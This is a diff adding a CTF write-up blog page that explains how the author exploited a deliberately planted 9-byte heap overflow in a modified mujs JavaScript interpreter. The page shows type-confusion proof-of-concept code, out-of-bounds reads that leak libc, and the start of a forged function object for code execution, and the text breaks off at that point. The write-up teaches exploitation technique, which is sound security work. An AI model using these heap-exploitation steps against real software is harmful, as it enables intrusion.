@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">
+
+      <title>
+  mujs interpreter 9 byte heap overflow to code execution - mujs - pwn - SUSCTF 2022 | khokho&#x27;s single writeup blog
+</title>
+
+      <link rel="stylesheet" href="https://khokho.ge/henry.css">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700|Roboto+Slab|Source+Code+Pro">
+
+      
+
+      
+      
+    </head>
+
+    <body>
+        <header>
+            <div class="header-content">
+                <a class="header-content-title" href="https:&#x2F;&#x2F;khokho.ge">khokho&#x27;s single writeup blog</a>
+                <nav class="header-content-nav">
+                    <a href="#" class="header-content-nav-icon">
+                    <svg viewBox="0 0 18 15" width="18">
+                        <path fill="#5c5c5c" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+                        <path fill="#5c5c5c" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+                        <path fill="#5c5c5c" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+                    </svg>
+                    </a>
+                    <div class="header-content-nav-trigger">
+                        
+                        
+                        <a class="header-content-nav-trigger-link" href="&#x2F;about">About</a>
+                        
+                        
+                    </div>
+                </nav>
+            </div>
+        </header>
+
+        <main class="blog">
+            
+<main class="page">
+    <article class="page-content" itemscope itemtype="http://schema.org/BlogPosting">
+        <h1 class="page-content-title" itemprop="name headline">mujs interpreter 9 byte heap overflow to code execution - mujs - pwn - SUSCTF 2022</h1>
+        <div class="page-content-meta">
+            <time datetime="2022-02-28T00:00:00+00:00" itemprop="datePublished">February 28, 2022</time>
+        </div>
+        <div class="page-content-body" itemprop="articleBody">
+            <h1 id="susctf">SUSCTF</h1>
+<p>I played <a href="https://ctftime.org/event/1566">SUSCTF 2022</a> with team SU this weekend and we got first place! I've decided to write my first ever writeup today. I solved mujs, rubbish maker and tttree. I liked all of them. I'll write about them in the order of solves.
+<img src="https://khokho.ge/susctf-mujs/results.png" alt="SUSCTF 2022 results" /></p>
+<h2 id="mujs-pwn">mujs - pwn</h2>
+<h3 id="statement">Statement</h3>
+<p>We are given an <a href="https://khokho.ge/susctf-mujs/./attachment.zip">attachment</a> and a statement:</p>
+<pre style="background-color:#282828;color:#fdf4c1aa;"><code><span>dd0a0972b4428771e6a3887da2210c7c9dd40f9c  
+</span><span>nc 124.71.182.21 9999
+</span></code></pre>
+<p>We are given a source code of <a href="https://github.com/ccxvii/mujs"><code>mujs</code></a> which is supposedly a js interpreter for embedded devices. It's not terribly big. We are also given compiled binary and libc which are running on remote server.</p>
+<p>The hash in the statement tells us that given source was modified from this specific commit of <code>mujs</code>: <a href="https://github.com/ccxvii/mujs/tree/dd0a0972b4428771e6a3887da2210c7c9dd40f9c">dd0a0972</a>. This commit is pretty new and no bugs seem to be fixed since then.</p>
+<p>I diffed the two source codes. Main difference that we see is: </p>
+<ul>
+<li>Some builtins being disabled in main.c; </li>
+<li>dataview.c being added which is a simple implementation of <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView">DataView</a>.</li>
+</ul>
+<p>Let's try connecting to remote:</p>
+<pre data-lang="sh" style="background-color:#282828;color:#fdf4c1aa;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#fdf4c1;">$ nc 124.71.182.21 9999
+</span><span style="color:#fdf4c1;">./tmp/13751.js
+</span><span style="color:#fdf4c1;">Please give your exp.js here, end with </span><span style="color:#b8bb26;">&#39;&lt; EOF &gt;&#39;</span><span style="color:#fdf4c1;">:
+</span><span style="color:#fdf4c1;">print(</span><span style="color:#b8bb26;">&quot;WOW&quot;</span><span>)
+</span><span>
+</span><span style="color:#fe8019;">&lt;</span><span> EOF </span><span style="color:#fe8019;">&gt;
+</span><span style="color:#fdf4c1;">last_size: 0
+</span><span style="color:#fdf4c1;">./mujs ./tmp/13751.js
+</span><span style="color:#fdf4c1;">WOW
+</span></code></pre>
+<p>This tells us that server reads our provided js file and runs it as :</p>
+<pre data-lang="sh" style="background-color:#282828;color:#fdf4c1aa;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#fdf4c1;">./mujs file.js
+</span></code></pre>
+<h3 id="finding-bug">Finding bug</h3>
+<p>I fired up <a href="https://github.com/AFLplusplus/AFLplusplus">afl++</a> right away so it would fuzz while I was working but it found no results. I also searched for <a href="https://www.cvedetails.com/product/34934/Artifex-Mujs.html?vendor_id=10846">mujs CVE's</a> and there were no code execution bugs since 2017 so I guessed the vulnerability must be in the modified code.</p>
+<p>First we need to understand what this added DataView does. Normal usage of DataView looks like this:</p>
+<pre data-lang="js" style="background-color:#282828;color:#fdf4c1aa;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#fdf4c1;">x </span><span style="color:#fe8019;">= </span><span style="color:#fa5c4b;">new </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">10</span><span>)
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">x.</span><span style="color:#8ec07c;">getUint8</span><span>(</span><span style="color:#d3869b;">0</span><span>))
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">x.</span><span style="color:#8ec07c;">getUint8</span><span>(</span><span style="color:#d3869b;">9</span><span>))
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">x.</span><span style="color:#8ec07c;">getUint8</span><span>(</span><span style="color:#d3869b;">12</span><span>)) </span><span style="font-style:italic;color:#928374;">// should not work
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">x.</span><span style="color:#8ec07c;">setUint32</span><span>(</span><span style="color:#d3869b;">0</span><span>, </span><span style="color:#d3869b;">10</span><span>))
+</span><span style="color:#fe8019;">...
+</span></code></pre>
+<p>Okay.</p>
+<p>After some time auditing I found this unusable oob write:</p>
+<pre data-lang="c" style="background-color:#282828;color:#fdf4c1aa;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#fa5c4b;">static void </span><span style="color:#8ec07c;">Dv_setUint32</span><span>(js_State </span><span style="color:#fe8019;">*</span><span style="color:#fdf4c1;">J</span><span>)
+</span><span>{
+</span><span>	js_Object </span><span style="color:#fe8019;">*</span><span>self </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">js_toobject(J, </span><span style="color:#d3869b;">0</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	</span><span style="color:#fa5c4b;">if </span><span>(self-&gt;type </span><span style="color:#fe8019;">!=</span><span> JS_CDATAVIEW) </span><span style="color:#fdf4c1;">js_typeerror(J, </span><span style="color:#b8bb26;">&quot;not an DataView&quot;</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	</span><span style="color:#fabd2f;">size_t</span><span> index </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">js_tonumber(J, </span><span style="color:#d3869b;">1</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	</span><span style="color:#fabd2f;">uint32_t</span><span> value </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">js_tonumber(J, </span><span style="color:#d3869b;">2</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>
+</span><span>	</span><span style="color:#fa5c4b;">if </span><span>(index</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">3 </span><span style="color:#fe8019;">&lt;</span><span> self-&gt;u.</span><span style="color:#fdf4c1;">dataview</span><span>.</span><span style="color:#fdf4c1;">length</span><span>) {
+</span><span>		</span><span style="color:#fe8019;">*</span><span>(</span><span style="color:#fabd2f;">uint32_t</span><span style="color:#fe8019;">*</span><span>)</span><span style="color:#fe8019;">&amp;</span><span>self-&gt;u.</span><span style="color:#fdf4c1;">dataview</span><span>.</span><span style="color:#fdf4c1;">data</span><span>[index] </span><span style="color:#fe8019;">=</span><span> value;
+</span><span>	} </span><span style="color:#fa5c4b;">else </span><span>{
+</span><span>		</span><span style="color:#fdf4c1;">js_error(J, </span><span style="color:#b8bb26;">&quot;out of bounds access on DataView&quot;</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	}
+</span><span>}
+</span></code></pre>
+<p>If we do <code>x.setUint32(-3, 0)</code> then index is -3(but unsigned) and so <code>index+3 &lt; length</code> check passes and we overwrite 3 bytes before the data buffer of DataView. This could be exploitable if data buffer was freed but it's freed nowhere... It basically automatically leaks <code>dataview.data</code> so no luck here.</p>
+<p>But then I found the glaringly obvious bug:</p>
+<pre data-lang="c" style="background-color:#282828;color:#fdf4c1aa;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#fa5c4b;">static void </span><span style="color:#8ec07c;">Dv_setUint8</span><span>(js_State </span><span style="color:#fe8019;">*</span><span style="color:#fdf4c1;">J</span><span>)
+</span><span>{
+</span><span>	js_Object </span><span style="color:#fe8019;">*</span><span>self </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">js_toobject(J, </span><span style="color:#d3869b;">0</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	</span><span style="color:#fa5c4b;">if </span><span>(self-&gt;type </span><span style="color:#fe8019;">!=</span><span> JS_CDATAVIEW) </span><span style="color:#fdf4c1;">js_typeerror(J, </span><span style="color:#b8bb26;">&quot;not an DataView&quot;</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	</span><span style="color:#fabd2f;">size_t</span><span> index </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">js_tonumber(J, </span><span style="color:#d3869b;">1</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	</span><span style="color:#fabd2f;">uint8_t</span><span> value </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">js_tonumber(J, </span><span style="color:#d3869b;">2</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	</span><span style="color:#fa5c4b;">if </span><span>(index </span><span style="color:#fe8019;">&lt;</span><span> self-&gt;u.</span><span style="color:#fdf4c1;">dataview</span><span>.</span><span style="color:#fdf4c1;">length</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">0x9</span><span>) { </span><span style="font-style:italic;color:#928374;">// &lt;---- here
+</span><span>		self-&gt;u.</span><span style="color:#fdf4c1;">dataview</span><span>.</span><span style="color:#fdf4c1;">data</span><span>[index] </span><span style="color:#fe8019;">=</span><span> value;
+</span><span>	} </span><span style="color:#fa5c4b;">else </span><span>{
+</span><span>		</span><span style="color:#fdf4c1;">js_error(J, </span><span style="color:#b8bb26;">&quot;out of bounds access on DataView&quot;</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	}
+</span><span>}
+</span></code></pre>
+<p>Here authors just allowed us 9 byte overflow and this is what we're going to use for our exploit.</p>
+<h3 id="leveraging-the-bug">Leveraging the bug</h3>
+<h4 id="type-confusion">Type confusion</h4>
+<p>Here my teammate had an I idea to do type confusion on js_Object:</p>
+<pre data-lang="c" style="background-color:#282828;color:#fdf4c1aa;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#fa5c4b;">struct </span><span style="color:#8ec07c;">js_Object
+</span><span>{
+</span><span>	</span><span style="color:#fa5c4b;">enum</span><span> js_Class type;
+</span><span>	</span><span style="color:#fa5c4b;">int</span><span> extensible;
+</span><span>	js_Property </span><span style="color:#fe8019;">*</span><span>properties;
+</span><span>	</span><span style="color:#fe8019;">...
+</span><span>}
+</span></code></pre>
+<p>Since type is 1 byte and we have 9 byte overflow it seems too perfect(8 bytes for malloc metadata + 1 for type) not to be true. And another teammate came up with poc of type confusion:</p>
+<pre data-lang="js" style="background-color:#282828;color:#fdf4c1aa;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x68</span><span>);
+</span><span style="color:#fdf4c1;">a </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">c </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span>
+</span><span>
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">8</span><span>); </span><span style="font-style:italic;color:#928374;">// change type of c to something
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span></code></pre>
+<p>Which prints:</p>
+<pre style="background-color:#282828;color:#fdf4c1aa;"><code><span>[object DataView]
+</span><span>[object String]
+</span></code></pre>
+<p>Nice!</p>
+<h4 id="overwriting-dataview-s-length">Overwriting DataView's length</h4>
+<p>js_Object uses C unions so different types can use same memory. Because C unions basically alias the same memory my idea was to somehow change DataView length using a field which is aliased to the same memory and make it bigger so we would have heap oob r/w.</p>
+<p>Here's what js_Object looks like:</p>
+<pre data-lang="c" style="background-color:#282828;color:#fdf4c1aa;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#fa5c4b;">struct </span><span style="color:#8ec07c;">js_Object
+</span><span>{
+</span><span>	</span><span style="color:#fa5c4b;">enum</span><span> js_Class type;
+</span><span>	</span><span style="color:#fa5c4b;">int</span><span> extensible;
+</span><span>	js_Property </span><span style="color:#fe8019;">*</span><span>properties;
+</span><span>	</span><span style="color:#fa5c4b;">int</span><span> count; 
+</span><span>	js_Object </span><span style="color:#fe8019;">*</span><span>prototype;
+</span><span>	</span><span style="color:#fa5c4b;">union </span><span>{
+</span><span>		</span><span style="color:#fa5c4b;">int</span><span> boolean;
+</span><span>		</span><span style="color:#fa5c4b;">double</span><span> number;
+</span><span>		</span><span style="color:#fa5c4b;">struct </span><span>{
+</span><span>			</span><span style="color:#fa5c4b;">const char </span><span style="color:#fe8019;">*</span><span>string;
+</span><span>			</span><span style="color:#fa5c4b;">int</span><span> length;
+</span><span>		} s;
+</span><span>		</span><span style="color:#fa5c4b;">struct </span><span>{
+</span><span>			</span><span style="color:#fa5c4b;">int</span><span> length;
+</span><span>		} a;
+</span><span>		</span><span style="color:#fa5c4b;">struct </span><span>{
+</span><span>			js_Function </span><span style="color:#fe8019;">*</span><span>function;
+</span><span>			js_Environment </span><span style="color:#fe8019;">*</span><span>scope;
+</span><span>		} f;
+</span><span>		</span><span style="color:#fa5c4b;">struct </span><span>{
+</span><span>			</span><span style="color:#fa5c4b;">const char </span><span style="color:#fe8019;">*</span><span>name;
+</span><span>			js_CFunction function;
+</span><span>			js_CFunction constructor;
+</span><span>			</span><span style="color:#fa5c4b;">int</span><span> length;
+</span><span>			</span><span style="color:#fa5c4b;">void </span><span style="color:#fe8019;">*</span><span>data;
+</span><span>			js_Finalize finalize;
+</span><span>		} c;
+</span><span>		js_Regexp r;
+</span><span>		</span><span style="color:#fa5c4b;">struct </span><span>{
+</span><span>			js_Object </span><span style="color:#fe8019;">*</span><span>target;
+</span><span>			js_Iterator </span><span style="color:#fe8019;">*</span><span>head;
+</span><span>		} iter;
+</span><span>		</span><span style="color:#fa5c4b;">struct </span><span>{
+</span><span>			</span><span style="color:#fa5c4b;">const char </span><span style="color:#fe8019;">*</span><span>tag;
+</span><span>			</span><span style="color:#fa5c4b;">void </span><span style="color:#fe8019;">*</span><span>data;
+</span><span>			js_HasProperty has;
+</span><span>			js_Put put;
+</span><span>			js_Delete delete;
+</span><span>			js_Finalize finalize;
+</span><span>		} user;
+</span><span>		</span><span style="color:#fa5c4b;">struct </span><span>{
+</span><span>		    </span><span style="color:#fabd2f;">uint32_t</span><span> length;
+</span><span>		    </span><span style="color:#fabd2f;">uint8_t</span><span style="color:#fe8019;">*</span><span> data;
+</span><span>		} dataview;
+</span><span>	} u;
+</span><span style="font-style:italic;color:#928374;">// ...
+</span><span>};
+</span></code></pre>
+<p>Here for example <code>js_Object.u.dataview.length</code> is stored at the same offset as <code>js_Object.u.number</code> and <code>js_Object.u.c.name</code>. </p>
+<p>So for overwriting <code>u.number</code> I found this: </p>
+<pre data-lang="c" style="background-color:#282828;color:#fdf4c1aa;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#fa5c4b;">static void </span><span style="color:#8ec07c;">js_setdate</span><span>(js_State </span><span style="color:#fe8019;">*</span><span style="color:#fdf4c1;">J</span><span>, </span><span style="color:#fa5c4b;">int </span><span style="color:#fdf4c1;">idx</span><span>, </span><span style="color:#fa5c4b;">double </span><span style="color:#fdf4c1;">t</span><span>)
+</span><span>{
+</span><span>	js_Object </span><span style="color:#fe8019;">*</span><span>self </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">js_toobject(J, idx)</span><span>;
+</span><span>	</span><span style="color:#fa5c4b;">if </span><span>(self-&gt;type </span><span style="color:#fe8019;">!=</span><span> JS_CDATE)
+</span><span>		</span><span style="color:#fdf4c1;">js_typeerror(J, </span><span style="color:#b8bb26;">&quot;not a date&quot;</span><span style="color:#fdf4c1;">)</span><span>;
+</span><span>	self-&gt;u.</span><span style="color:#fdf4c1;">number </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">TimeClip(t)</span><span>;
+</span><span>	</span><span style="color:#fdf4c1;">js_pushnumber(J, self-&gt;u.number)</span><span>;
+</span><span>}
+</span><span style="font-style:italic;color:#928374;">// ... called from here
+</span><span style="color:#fa5c4b;">static void </span><span style="color:#8ec07c;">Dp_setTime</span><span>(js_State </span><span style="color:#fe8019;">*</span><span style="color:#fdf4c1;">J</span><span>)
+</span><span>{
+</span><span>	</span><span style="color:#fdf4c1;">js_setdate(J, </span><span style="color:#d3869b;">0</span><span style="color:#fdf4c1;">, js_tonumber(J, </span><span style="color:#d3869b;">1</span><span style="color:#fdf4c1;">))</span><span>;
+</span><span>}
+</span></code></pre>
+<p>Let's try!</p>
+<p><code>JS_CDATE</code> value is 10 so we need to set <code>type</code> to 10 get <code>Date</code> object.</p>
+<pre data-lang="js" style="background-color:#282828;color:#fdf4c1aa;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x68</span><span>);
+</span><span style="color:#fdf4c1;">a </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">c </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span>
+</span><span>
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">10</span><span>); </span><span style="font-style:italic;color:#928374;">// set type of c to Date
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#fdf4c1;">c.</span><span style="color:#fabd2f;">setTime</span><span>(</span><span style="color:#d3869b;">0</span><span>)
+</span></code></pre>
+<p>Result:</p>
+<pre style="background-color:#282828;color:#fdf4c1aa;"><code><span>[object DataView]
+</span><span>[object Date]
+</span><span>TypeError: undefined is not callable
+</span><span>        at tconf.js:10
+</span></code></pre>
+<p>Hmm, type confusion worked but we can't call setTime? I was confused by this for some time but then I realized prototype of js object is set when it is first created so when we change type the prototype still stays the same. For those who don't know what prototype is it's basically what defines which methods exists on object.</p>
+<p>So this is where my understanding of <strong>cursed</strong> js's <code>this</code> helped me: 
+We can still call <code>setTime</code> using js's <code>bind</code>:</p>
+<pre data-lang="js" style="background-color:#282828;color:#fdf4c1aa;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#8ec07c;">Date</span><span style="color:#fdf4c1;">.</span><span style="color:#fabd2f;">prototype</span><span style="color:#fdf4c1;">.setTime.</span><span style="color:#8ec07c;">bind</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)(</span><span style="color:#d3869b;">12</span><span>)
+</span></code></pre>
+<p>And it works!</p>
+<pre data-lang="js" style="background-color:#282828;color:#fdf4c1aa;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x68</span><span>);
+</span><span style="color:#fdf4c1;">a </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">c </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span>
+</span><span>
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">10</span><span>); </span><span style="font-style:italic;color:#928374;">// set type of c to Date
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#8ec07c;">Date</span><span style="color:#fdf4c1;">.</span><span style="color:#fabd2f;">prototype</span><span style="color:#fdf4c1;">.setTime.</span><span style="color:#8ec07c;">bind</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)(</span><span style="color:#d3869b;">1.09522e+12</span><span>)
+</span><span>
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">16</span><span>); </span><span style="font-style:italic;color:#928374;">// type of c back to DataView
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">getLength</span><span>())
+</span></code></pre>
+<p>Viola:</p>
+<pre style="background-color:#282828;color:#fdf4c1aa;"><code><span>[object DataView]
+</span><span>[object Date]
+</span><span>1587544064
+</span></code></pre>
+<p>Now you might think overwriting <code>u.number</code> which is <code>double</code> and is 8 bytes would overwrite <code>u.dataview.data</code>'s first 4 bytes since <code>u.dataview.length</code> is 4 bytes. But padding saved us here so <code>data</code> pointer is unaffected as well. </p>
+<h3 id="using-heap-oob-r-w-for-code-execution">Using heap OOB r/w for code execution</h3>
+<p>So this part is mostly exploring heap and finding out what object lie on it. But I can also control stuff on it as well. So I allocated two DataView's, <em>after</em> <code>c</code> which I can find offsets to. <a href="https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/heap_overview/">We know</a> that allocating more than 128kb using <code>malloc</code> causes it to be <code>mmap</code>'d and knowing the address of that chunk leaks libc's base.</p>
+<p>Let's try:</p>
+<pre data-lang="js" style="background-color:#282828;color:#fdf4c1aa;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x68</span><span>);
+</span><span style="color:#fdf4c1;">a </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">b </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">c </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">e </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x48</span><span>);
+</span><span style="color:#fdf4c1;">f </span><span style="color:#fe8019;">= </span><span style="color:#8ec07c;">DataView</span><span>(</span><span style="color:#d3869b;">0x1000 </span><span style="color:#fe8019;">* </span><span style="color:#d3869b;">0x1000</span><span>);
+</span><span>
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">10</span><span>); </span><span style="font-style:italic;color:#928374;">// set c type to Date
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#8ec07c;">Date</span><span style="color:#fdf4c1;">.</span><span style="color:#fabd2f;">prototype</span><span style="color:#fdf4c1;">.setTime.</span><span style="color:#8ec07c;">bind</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)(</span><span style="color:#d3869b;">1.09522e+12</span><span>) </span><span style="font-style:italic;color:#928374;">// write random big number to u.number/u.length
+</span><span style="color:#fdf4c1;">b.</span><span style="color:#8ec07c;">setUint8</span><span>(</span><span style="color:#d3869b;">0x48</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">8</span><span>, </span><span style="color:#d3869b;">16</span><span>); </span><span style="font-style:italic;color:#928374;">// set c type back to DataView
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c</span><span>)
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">getLength</span><span>())
+</span><span>
+</span><span>
+</span><span style="color:#fdf4c1;">sh32 </span><span style="color:#fe8019;">= </span><span style="color:#d3869b;">4294967296 </span><span style="font-style:italic;color:#928374;">// 1&lt;&lt;32
+</span><span style="color:#fdf4c1;">libb_addr_off </span><span style="color:#fe8019;">= </span><span style="color:#d3869b;">472
+</span><span style="color:#fdf4c1;">libc_leak </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">getUint32</span><span>(</span><span style="color:#fdf4c1;">libb_addr_off</span><span>) </span><span style="color:#fe8019;">+ </span><span>(</span><span style="color:#fdf4c1;">c.</span><span style="color:#8ec07c;">getUint32</span><span>(</span><span style="color:#fdf4c1;">libb_addr_off</span><span style="color:#fe8019;">+</span><span style="color:#d3869b;">4</span><span>)</span><span style="color:#fe8019;">*</span><span style="color:#fdf4c1;">sh32</span><span>)
+</span><span>
+</span><span style="color:#fdf4c1;">libc_off </span><span style="color:#fe8019;">= </span><span style="color:#d3869b;">0x7ffff7c31000 </span><span style="color:#fe8019;">- </span><span style="color:#d3869b;">0x7ffff6bfe010 </span><span style="font-style:italic;color:#928374;">// got this from gdb
+</span><span style="color:#fdf4c1;">libc_base </span><span style="color:#fe8019;">= </span><span style="color:#fdf4c1;">libc_leak </span><span style="color:#fe8019;">+ </span><span style="color:#fdf4c1;">libc_off
+</span><span style="color:#8ec07c;">print</span><span>(</span><span style="color:#b8bb26;">&#39;libc base:&#39;</span><span>, </span><span style="color:#fdf4c1;">libc_base.</span><span style="color:#fabd2f;">toString</span><span>(</span><span style="color:#d3869b;">16</span><span>))
+</span></code></pre>
+<p>Using this prints:</p>
+<pre style="background-color:#282828;color:#fdf4c1aa;"><code><span>[object DataView]
+</span><span>[object Date]
+</span><span>[object DataView]
+</span><span>1587544064
+</span><span>libc base: 7f786e7e8000
+</span></code></pre>
+<p>So, now we've leaked libc base.</p>
+<p>For controlling code execution I forged a <code>JS_CCFUNCTION</code> type of object which has a <code>u.c.function</code>:</p>
+<p>This type of js object can simple be called inside js and will result in underlying <code>u.c.function</code> being called. Since we have full control over heap we can modify a DataView object to become <code>CCFUNCTION</code>.</p>
+<p>Here's the line where it get's called:</p>
+<pre data-lang="c" style="background-color:#282828;color:#fdf4c1aa;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#fa5c4b;">void </span><span style="color:#8ec07c;">js_call</span><span>(js_State </span><span style="color:#fe8019;">*</span><span style="color:#fdf4c1;">J</span><span>, </span><span style="color:#fa5c4b;">int </span><span style="color:#fdf4c1;">n</span><span>)
+</span><span>{
+</span><span style="font-style:italic;color:#928374;">// ...
+</span><span>	} </span><span style="color:#fa5c4b;">else if </span><span>(obj-&gt;type </span><span style="color:#fe8019;">==</span><span> JS_CCFUNCTION) {
